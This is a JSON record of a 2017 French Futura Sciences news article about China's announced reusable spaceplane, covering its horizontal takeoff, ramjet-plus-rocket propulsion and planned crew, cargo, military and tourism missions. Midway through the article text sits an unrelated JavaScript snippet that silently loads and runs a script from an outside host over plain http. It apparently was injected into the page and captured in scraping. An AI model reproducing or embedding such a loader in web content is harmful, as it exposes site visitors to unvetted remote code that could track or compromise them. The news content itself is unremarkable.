{"title": "Un avion-navette spatiale annoncé par la Chine", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "13/11/2017", "content": "D'ici trois ans, la Chine entend lancer un avion spatial réutilisable capable d'atteindre l'orbite. Technologiquement, tout n'est visiblement pas maîtrisé. Mais pour combien de temps ? Sans surprise, les informations sont rares. Ce qu'il faut retenir Inédit : un véhicule spatial qui décolle et atterrit comme un avion.  L'aérospatiale chinoise à quelques encablures de prendre une avance technologique. Multi-tâches, il se destine au transport de passager, de fret et servira aussi à des fins commerciales et touristiques. Il y a quelques jours, de nombreux quotidiens chinois ont rapporté une déclaration de la CASTC ( China Aerospace Science and Technology Corporation ) annonçant le lancement d'un avion spatial réutilisable en 2020. Il était connu que la Chine travaille sur plusieurs concepts de véhicules spatiaux réutilisables, dont certains habités, mais l'existence d'un tel projet aussi avancé est très surprenante. Une première question est celle de la nature du véhicule, qui semble distincts des deux projets déjà connus. Le dernier est l'avion spatial Teng Yun, présenté lors de la conférence internationale  Global Space Exploration 2017 , qui s'est tenue à Pékin, et annoncé à l'horizon 2030. Le premier était bien celui d'une famille d' avions spatiaux et suborbitaux réutilisables , dévoilé lors du 67 e  congrès international d' astronautique , en septembre 2016 au Mexique. Mais plusieurs des caractéristiques annoncées (performances, missions, décollage à la verticale) diffèrent de celles de l'avion spatial prévu en 2020.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un avion spatial pour un accès peu coûteux à l'orbite basse Difficile d'y voir clair donc. Cependant, quelques informations ont été rendues publiques sur ce futur véhicule. Il sera réutilisable, ce qui n'est pas une surprise. En revanche, il est censé décoller et atterrir horizontalement, ce qui serait une première mondiale. La  navette spatiale américaine  ou le  X-37B  décollent à la verticale. L'avion spatial chinois utilisera deux types de motorisation. Un  statoréacteur  lui permettra d'atteindre les couches supérieures de l' atmosphère  et un moteur-fusée le mettra en  orbite  autour de la  Terre . En outre, les délais de mise en œuvre sont censément très courts. Il se cantonnera à l'orbite basse, de 300 à 500 kilomètres d'altitude, et répond à des besoins identifiés par les agences spatiales pour une très grande variété de missions. Par exemple, il pourra être utilisé pour la rotation des équipages et le transport de fret à destination de la  Station spatiale chinoise , qui devrait fonctionner à la date de la mise en service de ce véhicule. Il servira également à des fins militaires et pour des services commerciaux et de tourisme spatial. ", "theme": "sciences"}